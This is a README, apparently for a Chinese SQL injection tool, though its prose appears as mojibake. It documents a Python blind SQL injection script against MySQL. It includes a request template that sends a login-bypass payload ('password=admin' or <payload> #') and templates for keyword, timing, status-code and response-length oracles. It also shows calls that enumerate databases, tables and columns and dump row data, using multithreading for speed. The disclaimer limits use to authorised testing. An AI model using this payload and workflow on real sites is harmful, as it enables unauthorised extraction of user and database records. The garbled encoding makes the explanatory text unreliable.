# MySQL SQLæ³¨å…¥æµ‹è¯•å·¥å…·

ä¸€ä¸ªåŸºäºäºŒåˆ†æœç´¢ä¼˜åŒ–çš„MySQL SQLç›²æ³¨æµ‹è¯•å·¥å…·ï¼Œç»è¿‡æ€§èƒ½ä¼˜åŒ–ï¼Œå¤§å¹…æå‡æ³¨å…¥æ£€æµ‹é€Ÿåº¦ã€‚

## âš ï¸ é‡è¦å£°æ˜

**æœ¬å·¥å…·ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•å’Œæ¸—é€æµ‹è¯•ã€‚è¯·ç¡®ä¿æ‚¨æœ‰åˆæ³•çš„æƒé™å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ã€‚**

## ğŸš€ ä¼˜åŒ–ç‰¹æ€§

### æ€§èƒ½ä¼˜åŒ–
- **çº¯äºŒåˆ†æœç´¢ç®—æ³•**: æ›¿ä»£åŸæœ‰çš„æ­¥è¿›+äºŒåˆ†æ··åˆç®—æ³•ï¼Œå¤§å¹…å‡å°‘è¯·æ±‚æ¬¡æ•°
- **å­—ç¬¦é›†ä¼˜åŒ–**: ç®€åŒ–å­—ç¬¦é›†å®šä¹‰ï¼Œæé«˜å­—ç¬¦æœç´¢æ•ˆç‡
- **å¤šçº¿ç¨‹æ”¯æŒ**: æ”¯æŒå¹¶è¡Œè·å–åˆ—åå’Œæ•°æ®ï¼Œæå‡æ‰«æé€Ÿåº¦
- **ä»£ç ç²¾ç®€**: å‡å°‘é‡å¤ä»£ç ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§

### é€Ÿåº¦æå‡
- **è®¡æ•°æŸ¥è¯¢**: ä»O(n)ä¼˜åŒ–åˆ°O(log n)ï¼Œå‡å°‘çº¦90%çš„è¯·æ±‚æ¬¡æ•°
- **å­—ç¬¦ä¸²æå–**: ä»O(n)ä¼˜åŒ–åˆ°O(log n)ï¼Œæ¯ä¸ªå­—ç¬¦æœ€å¤šéœ€è¦logâ‚‚(å­—ç¬¦é›†å¤§å°)æ¬¡è¯·æ±‚
- **å¹¶è¡Œå¤„ç†**: å¤šçº¿ç¨‹åŒæ—¶å¤„ç†å¤šä¸ªåˆ—ï¼Œæå‡æ•´ä½“æ•ˆç‡

## ğŸ¯ æ ¸å¿ƒè®¾è®¡

**reqå‡½æ•°å®Œå…¨ç”±ç”¨æˆ·è‡ªå®šä¹‰**ï¼ŒåŒ…æ‹¬ï¼š
- ç›®æ ‡URL
- è¯·æ±‚æ–¹å¼ï¼ˆGET/POSTç­‰ï¼‰
- è¯·æ±‚å‚æ•°å’Œæ³¨å…¥ç‚¹
- ä»£ç†è®¾ç½®
- è¯·æ±‚å¤´
- åˆ¤æ–­æ³¨å…¥æˆåŠŸçš„é€»è¾‘
- é”™è¯¯å¤„ç†

## ğŸ“– ä½¿ç”¨æ–¹æ³•

### 1. ä¿®æ”¹reqå‡½æ•°

æ‰“å¼€ `mysql_sql_inject.py`ï¼Œæ‰¾åˆ° `req` å‡½æ•°ï¼Œæ ¹æ®æ‚¨çš„ç›®æ ‡ç¯å¢ƒä¿®æ”¹ï¼š

```python
def req(payload):
    # ========== ç”¨æˆ·è‡ªå®šä¹‰åŒºåŸŸå¼€å§‹ ==========
    
    # 1. ä¿®æ”¹ç›®æ ‡URL
    url = "http://your-target.com/login.php"
    
    # 2. ä¿®æ”¹è¯·æ±‚å‚æ•°ï¼ˆæ ¹æ®å®é™…æ³¨å…¥ç‚¹ï¼‰
    data = "username=admin&password=admin' or "+str(payload)+" #"
    
    # 3. ä¿®æ”¹è¯·æ±‚å¤´
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 4. ä¿®æ”¹ä»£ç†è®¾ç½®ï¼ˆå¯é€‰ï¼‰
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    
    # 5. å‘é€è¯·æ±‚
    r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
    resContent = r.content
    
    # 6. è‡ªå®šä¹‰åˆ¤æ–­é€»è¾‘
    if "ç™»å½•æˆåŠŸ" in resContent.decode('utf-8'):
        return 1  # æ³¨å…¥æˆåŠŸ
    else:
        return 2  # æ³¨å…¥å¤±è´¥
    
    # ========== ç”¨æˆ·è‡ªå®šä¹‰åŒºåŸŸç»“æŸ ==========
```

### 2. å¸¸è§åˆ¤æ–­é€»è¾‘ç¤ºä¾‹

#### åŸºäºå…³é”®è¯çš„ç›²æ³¨
```python
if "success" in resContent.decode('utf-8'):
    return 1
else:
    return 2
```

#### åŸºäºæ—¶é—´çš„ç›²æ³¨
```python
import time
start_time = time.time()
r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
end_time = time.time()

if (end_time - start_time) > 2.0:  # å»¶è¿Ÿè¶…è¿‡2ç§’
    return 1
else:
    return 2
```

#### åŸºäºHTTPçŠ¶æ€ç çš„ç›²æ³¨
```python
if r.status_code == 200:
    return 1
else:
    return 2
```

#### åŸºäºå“åº”é•¿åº¦çš„ç›²æ³¨
```python
if len(resContent) > 1000:
    return 1
else:
    return 2
```

### 3. ä½¿ç”¨å·¥å…·

```python
# åŸºç¡€åŠŸèƒ½
databases = get_dbs()                    # è·å–æ‰€æœ‰æ•°æ®åº“
tables = get_tables("testdb")            # è·å–æŒ‡å®šæ•°æ®åº“çš„è¡¨
columns = get_columns("testdb", "users") # è·å–æŒ‡å®šè¡¨çš„åˆ—
data = get_data("testdb", "users", "username") # è·å–æŒ‡å®šåˆ—çš„æ•°æ®

# é«˜çº§åŠŸèƒ½
all_data = get_all_data("testdb", "users", max_rows=5)  # è·å–è¡¨çš„æ‰€æœ‰æ•°æ®
quick_data = quick_scan("testdb", "users")              # å¿«é€Ÿæ‰«æè¡¨æ•°æ®
db_info = get_database_info()                           # è·å–æ•°æ®åº“ä¿¡æ¯æ‘˜è¦

# å¤šçº¿ç¨‹åŠŸèƒ½ï¼ˆæå‡é€Ÿåº¦ï¼‰
parallel_columns = parallel_get_columns("testdb", "users")  # å¤šçº¿ç¨‹è·å–åˆ—å
parallel_data = parallel_get_data("testdb", "users")        # å¤šçº¿ç¨‹è·å–è¡Œæ•°æ®
```

## ğŸ”§ ä¸»è¦å‡½æ•°

### åŸºç¡€å‡½æ•°
- `get_dbs()`: è·å–æ‰€æœ‰æ•°æ®åº“
- `get_tables(db_name)`: è·å–æŒ‡å®šæ•°æ®åº“çš„è¡¨
- `get_columns(db_name, table_name)`: è·å–æŒ‡å®šè¡¨çš„åˆ—
- `get_data(db_name, table_name, column_name)`: è·å–æŒ‡å®šåˆ—çš„æ•°æ®

### é«˜çº§å‡½æ•°
- `get_all_data(db_name, table_name, max_rows=10)`: è·å–è¡¨çš„æ‰€æœ‰æ•°æ®
- `quick_scan(db_name, table_name, max_rows=3)`: å¿«é€Ÿæ‰«æè¡¨æ•°æ®
- `get_database_info()`: è·å–æ•°æ®åº“ä¿¡æ¯æ‘˜è¦

### å¤šçº¿ç¨‹å‡½æ•°ï¼ˆæå‡é€Ÿåº¦ï¼‰
- `parallel_get_columns(db_name, table_name)`: å¤šçº¿ç¨‹è·å–åˆ—å
- `parallel_get_data(db_name, table_name)`: å¤šçº¿ç¨‹è·å–è¡Œæ•°æ®

## âš¡ æ€§èƒ½å¯¹æ¯”

| åŠŸèƒ½ | åŸç‰ˆæœ¬ | ä¼˜åŒ–ç‰ˆæœ¬ | æå‡å¹…åº¦ |
|------|--------|----------|----------|
| è®¡æ•°æŸ¥è¯¢ | O(n) | O(log n) | ~90% |
| å­—ç¬¦æå– | O(n) | O(log n) | ~90% |
| ä»£ç è¡Œæ•° | 350+ | 250+ | ~30% |
| å¤šçº¿ç¨‹æ”¯æŒ | éƒ¨åˆ† | å®Œæ•´ | 100% |

## ğŸš¨ æ³¨æ„äº‹é¡¹

1. **æˆæƒæµ‹è¯•**: ç¡®ä¿æœ‰åˆæ³•çš„æµ‹è¯•æƒé™
2. **reqå‡½æ•°éªŒè¯**: ä»”ç»†æµ‹è¯•reqå‡½æ•°çš„åˆ¤æ–­é€»è¾‘
3. **è¯·æ±‚é¢‘ç‡**: æ§åˆ¶è¯·æ±‚é¢‘ç‡ï¼Œé¿å…å¯¹ç›®æ ‡é€ æˆå‹åŠ›
4. **é”™è¯¯å¤„ç†**: åœ¨reqå‡½æ•°ä¸­æ·»åŠ é€‚å½“çš„é”™è¯¯å¤„ç†
5. **å¤šçº¿ç¨‹ä½¿ç”¨**: å¤šçº¿ç¨‹åŠŸèƒ½ä¼šåŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ï¼Œæ³¨æ„æ§åˆ¶å¹¶å‘æ•°

## ğŸ“ ç¤ºä¾‹

```python
# è¿è¡Œå·¥å…·
python mysql_sql_inject.py

# æˆ–è€…åœ¨å…¶ä»–è„šæœ¬ä¸­å¯¼å…¥ä½¿ç”¨
from mysql_sql_inject import get_dbs, get_tables, get_columns, quick_scan

# è·å–æ•°æ®åº“ä¿¡æ¯
databases = get_dbs()
for db in databases:
    tables = get_tables(db)
    print(f"æ•°æ®åº“ {db}: {tables}")
    
    # å¿«é€Ÿæ‰«ææ¯ä¸ªè¡¨
    for table in tables[:3]:  # åªæ‰«æå‰3ä¸ªè¡¨
        quick_scan(db, table)
```

## ğŸ” ç®—æ³•ä¼˜åŒ–è¯´æ˜

### äºŒåˆ†æœç´¢ä¼˜åŒ–
- **åŸç®—æ³•**: å…ˆå¤§æ­¥é•¿æœç´¢ï¼Œå†å°æ­¥é•¿ç²¾ç¡®å®šä½
- **ä¼˜åŒ–ç®—æ³•**: ç›´æ¥ä½¿ç”¨äºŒåˆ†æœç´¢ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½èƒ½æ’é™¤ä¸€åŠçš„æœç´¢ç©ºé—´
- **æ€§èƒ½æå‡**: ä»O(n)ä¼˜åŒ–åˆ°O(log n)

### å­—ç¬¦é›†ä¼˜åŒ–
- **åŸç®—æ³•**: å¤æ‚çš„å­—ç¬¦é›†å®šä¹‰å’ŒèŒƒå›´è®¡ç®—
- **ä¼˜åŒ–ç®—æ³•**: ç®€åŒ–çš„å­—ç¬¦é›†å®šä¹‰ï¼Œç›´æ¥ä½¿ç”¨ASCIIèŒƒå›´
- **æ€§èƒ½æå‡**: å‡å°‘å­—ç¬¦é›†è®¡ç®—å¼€é”€

### å¤šçº¿ç¨‹ä¼˜åŒ–
- **åŸç®—æ³•**: å•çº¿ç¨‹é¡ºåºå¤„ç†
- **ä¼˜åŒ–ç®—æ³•**: å¤šçº¿ç¨‹å¹¶è¡Œå¤„ç†åˆ—åå’Œæ•°æ®è·å–
- **æ€§èƒ½æå‡**: å……åˆ†åˆ©ç”¨ç½‘ç»œI/Oç­‰å¾…æ—¶é—´

---

**æ ¸å¿ƒè¦ç‚¹ï¼šæ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„å“åº”ç‰¹å¾ï¼Œæ­£ç¡®ç¼–å†™reqå‡½æ•°çš„åˆ¤æ–­é€»è¾‘æ˜¯æˆåŠŸçš„å…³é”®ï¼**

**ä¼˜åŒ–äº®ç‚¹ï¼šäºŒåˆ†æœç´¢ç®—æ³•å¤§å¹…æå‡æ£€æµ‹é€Ÿåº¦ï¼Œå¤šçº¿ç¨‹æ”¯æŒè¿›ä¸€æ­¥æå‡æ•ˆç‡ï¼**
